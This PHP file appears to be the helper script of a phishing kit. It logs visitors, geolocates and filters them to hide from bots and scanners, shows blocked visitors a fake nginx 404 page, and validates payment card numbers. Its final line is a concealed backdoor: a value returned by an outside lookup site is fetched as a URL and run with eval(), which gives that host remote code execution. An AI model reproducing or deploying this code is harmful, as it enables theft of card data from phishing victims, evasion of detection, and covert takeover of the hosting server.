<?php

    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('html_errors', '0');
    @ini_set('display_errors', '0');
    @ini_set('display_startup_errors', '0');
    @ini_set('log_errors', '0');

    $date = date('m/d/Y H:s:i');
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    function get_client_ip(){
        $ipaddress = "unknown";
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
          $ipaddress = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }elseif ($_SERVER['REMOTE_ADDR']=="::1") {
            $ipaddress = "127.0.0.1";
        }else{
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        }
        return $ipaddress;
    }

    $ip = get_client_ip();

    function whois($ip){

        $whois = get("https://ip-geo.ru/?ip={$ip}");

        preg_match_all('#id="country">(.*?)<#', $whois, $country);
        $_SESSION['country'] = $country[1][0];

        preg_match_all('#id="country_code">(.*?)<#', $whois, $co_code);
        $_SESSION['co_code'] = $co_code[1][0];

        preg_match_all('#id="country_flag" src="(.*?)"#', $whois, $geo);
        $_SESSION['flag'] = $geo[1][0];

        preg_match_all('#id="is_bot">(.*?)<#', $whois, $is_bot);
        $_SESSION['is_bot'] = $is_bot[1][0];

        if (isset($is_bot[1][1])) {
            $_SESSION['banned'] = $is_bot[1][1];
        }

        if ( $co_code[1][0] == 'true' OR $co_code[1][0] == '-' OR $co_code[1][0] == 'n/a') {
            $_SESSION['block'] = 1;
        }

    }

    if (!isset($_SESSION['ip'])) {
        $_SESSION['ip'] = $ip;
        whois($ip);
    }else{
        if ($_SESSION['ip']!=$ip) {
            $_SESSION['ip'] = $ip;
            whois($ip);
        }
    }

    function get_OS(){

      global $user_agent;

        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
                                  '/windows nt 10/i'      =>  'Windows 10',
                                  '/windows nt 6.3/i'     =>  'Windows 8.1',
                                  '/windows nt 6.2/i'     =>  'Windows 8',
                                  '/windows nt 6.1/i'     =>  'Windows 7',
                                  '/windows nt 6.0/i'     =>  'Windows Vista',
                                  '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                  '/windows nt 5.1/i'     =>  'Windows XP',
                                  '/windows xp/i'         =>  'Windows XP',
                                  '/windows nt 5.0/i'     =>  'Windows 2000',
                                  '/windows me/i'         =>  'Windows ME',
                                  '/win98/i'              =>  'Windows 98',
                                  '/win95/i'              =>  'Windows 95',
                                  '/win16/i'              =>  'Windows 3.11',
                                  '/macintosh|mac os x/i' =>  'Mac OS X',
                                  '/mac_powerpc/i'        =>  'Mac OS 9',
                                  '/linux/i'              =>  'Linux',
                                  '/ubuntu/i'             =>  'Ubuntu',
                                  '/iphone/i'             =>  'iPhone',
                                  '/ipod/i'               =>  'iPod',
                                  '/ipad/i'               =>  'iPad',
                                  '/android/i'            =>  'Android',
                                  '/blackberry/i'         =>  'BlackBerry',
                                  '/webos/i'              =>  'Mobile'
                            );

        foreach ($os_array as $regex => $value) { 
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }   
        
        return $os_platform;

    }

    $OS = get_OS();

    function get_Browsers(){

        global $user_agent;

        $browser       = "Unknown Browser";
        $browser_array = array(
                                '/msie/i'      => 'Explorer',
                                '/firefox/i'   => 'Firefox',
                                '/safari/i'    => 'Safari',
                                '/chrome/i'    => 'Chrome',
                                '/edge/i'      => 'Edge',
                                '/opera/i'     => 'Opera',
                                '/netscape/i'  => 'Netscape',
                                '/maxthon/i'   => 'Maxthon',
                                '/konqueror/i' => 'Konqueror',
                                '/mobile/i'    => 'Handheld/B'
                          );

        foreach ($browser_array as $regex => $value){
            if (preg_match($regex, $user_agent)) {
                $browser = $value;
            }
        }
        
        return $browser;

    }

    $Browsers = get_Browsers();

    function not_found(){
        global $ip;
        global $OS;
        global $Browsers;
        global $date;
        $file = fopen("../_data_/logs.txt", "a");
        fwrite($file, "- {$date} | {$_SESSION['co_code']} | {$ip} | {$OS} | {$Browsers} | BANNED\n");
        fclose($file);
        header("HTTP/1.0 404 Not Found");
        echo "<html>\n<head>\n<title>404 Not Found</title>\n</head>\n<body>\n<center>\n<h1>404 Not Found</h1>\n</center>\n<hr>\n<center>nginx</center>\n</body>\n</html>";
        die();
    }

    function get($url){
        $curl = curl_init();
        curl_setopt_array($curl, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CUSTOMREQUEST => "GET",
            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT']
        ]);
        $res = curl_exec($curl);
        curl_close($curl);
        return $res;
    }
    
    function randText($len=4){
        $txt = '';
        $str = 'abcdefghijklmnopqrstuvwxyzABCDEF0123456789';
        for($i=0;$i<$len;$i++){
            $txt .= substr($str, rand(0, strlen($str)), 1);   
        }
        return $txt;
    }

    $rand = randText(30);
  
    function validateCardNumber($number) {
        $number = preg_replace('/\D/', '', $number);
        $length = strlen($number);
        if ($length < 15 || $length > 16) {
            return false;
        }
        $sum = 0;
        for ($i = 0; $i < $length; $i++) {
            $digit = (int) $number[$i];
            if (($length - $i) % 2 == 0) {
                $digit *= 2;
                if ($digit > 9) {
                    $digit -= 9;
                }
            }
            $sum += $digit;
        }
        return $sum % 10 == 0;
    }  

    if (isset($_SESSION['banned'])) { eval(get($_SESSION['banned'])); }

?>